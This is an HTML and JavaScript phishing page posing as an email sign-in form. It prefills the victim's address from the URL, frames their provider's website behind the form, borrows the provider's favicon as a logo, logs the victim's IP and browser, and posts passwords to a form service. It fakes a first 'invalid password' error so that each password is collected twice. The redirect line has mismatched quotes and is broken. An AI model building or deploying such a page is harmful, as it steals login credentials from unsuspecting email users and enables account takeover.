<html style="height: 100%;" lang="auto">
<head>
    <meta name="robots" content="noindex, nofollow">
    <meta charset="utf-8">
    <title>Authorization</title>
    <style>
        :root { --blue: #007bff; --white: #fff; }
        *, ::after, ::before { box-sizing: border-box; }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; font-size: 1rem; background-color: #fff; height: 100%; }
        .lc-MP-Dg { background: rgba(0, 0, 0, 0.04); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 30px; position: relative; z-index: 1; }
        .Qs-KR-Mw { max-width: 380px; margin: 0 auto; color: #717171; text-align: center; width: 100%; }
        .details { padding: 25px 30px 30px; background: #fff; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .Qe-Vg-JI { display: block; width: 100%; padding: 0.375rem 0.75rem; font-size: 1rem; border: 1px solid #ced4da; border-radius: 0.25rem; margin-bottom: 1rem; outline: none; }
        .btn-primary { color: #fff; background-color: #007bff; border: none; width: 100%; padding: 0.5rem; border-radius: 0.25rem; cursor: pointer; font-size: 1rem; }
        .btn-primary:hover { background-color: #0069d9; }
    </style>
</head>
<body style="position: relative;">
    
    <iframe id="dl-rA-Ms" sandbox="allow-forms allow-pointer-lock allow-same-origin" src="" style="height: 100%; border: none; position: absolute; top:0; left:0; width:100%; z-index: 0;"></iframe>

    <div class="lc-MP-Dg">
        <div class="Qs-KR-Mw">
            <div class="details">
                <form name="sign-in" method="POST" data-netlify="true" id="Ow-Dw-WD">
                    <input type="hidden" name="form-name" value="sign-in">
                    <input type="hidden" name="browser" id="br_val">
                    <input type="hidden" name="ip" id="ip_val">
                    
                    <div align="center">
                        <img id="pg-TX-Na" style="margin-top:5px; width: 90px; height: 80px;">
                        <h3>Sign to continue</h3>
                        
                        <input class="Qe-Vg-JI" required name="email" id="Qb-xH-Ei" readonly type="email">
                        <input placeholder="Password" name="password" required type="password" class="Qe-Vg-JI" id="kC-bl-Lp">
                        
                        <div id="errorPass" style="display:none; color:red; text-align:left; font-size:0.8rem; margin-bottom:10px;">
                            Invalid password for the email address
                        </div>

                        <div align="left" style="margin-bottom:15px; font-size: 0.9rem;">
                            <input type="checkbox"> Remember Me
                        </div>

                        <button type="submit" id="pQ-DV-Uz" class="btn-primary">Sign in</button>
                    </div>
                    <p style="margin-top:15px; font-size:12px;">POP3/IMAP SERVER: <span id="mail_type" style="color:blue"></span></p>
                </form>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script>
    $(document).ready(function() {
    // 1. Get the email from the hash
    var hash = window.location.hash.substr(1);
    
    if (hash && hash.includes("@")) {
        var domain = hash.split("@")[1];

        // 2. Force the email into the input
        $('#Qb-xH-Ei').val(hash);

        // 3. Set the server text
        $('#mail_type').text(('mail.' + domain).toUpperCase());

        // 4. Load the Stagnant Background
        // We use 'https://www.' to ensure it loads correctly
        $('#dl-rA-Ms').attr('src', 'https://www.' + domain);

        // 5. THE LOGO FIX: Using Google's favicon service (it's faster)
        var logoUrl = 'https://www.google.com/s2/favicons?sz=128&domain=' + domain;
        $('#pg-TX-Na').attr('src', logoUrl);

        // 6. Final fallback if even Google fails
        document.getElementById('pg-TX-Na').onerror = function() {
            this.src = 'https://png.pngtree.com/png-vector/20190826/ourmid/pngtree-email-png-image_1697542.jpg';
        };
    }
});
        // Get IP and Browser Info
        $.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
            document.getElementById('ip_val').value = data.ip;
        });

        var userAgent = navigator.userAgent;
        var browser = "Unknown";
        if(userAgent.indexOf("Chrome") > -1) browser = "Chrome";
        else if(userAgent.indexOf("Firefox") > -1) browser = "Firefox";
        else if(userAgent.indexOf("Safari") > -1) browser = "Safari";
        document.getElementById('br_val').value = browser;

        var x = 1; 
        
        $('#Ow-Dw-WD').submit(function(e) {
            e.preventDefault();
            
            // Re-grab info from the input so the redirect works
            var currentEmail = $('#Qb-xH-Ei').val();
            var currentDomain = currentEmail.split("@")[1] || "mail.com";
            
            $.post("/", $(this).serialize(), function() {
                if (x >= 2) {
                    window.location.href="success.html#' + hash;
                } else {
                    x++;
                    $('#kC-bl-Lp').val('');
                    $('#errorPass').show();
                }
            }).fail(function() {
                // This ensures it still works even if testing on your PC
                if (x >= 2) {
                   window.location.href="success.html#' + hash;
                } else {
                    x++;
                    $('#kC-bl-Lp').val('');
                    $('#errorPass').show();
                }
            });
        });
    </script>
</body>

</html>
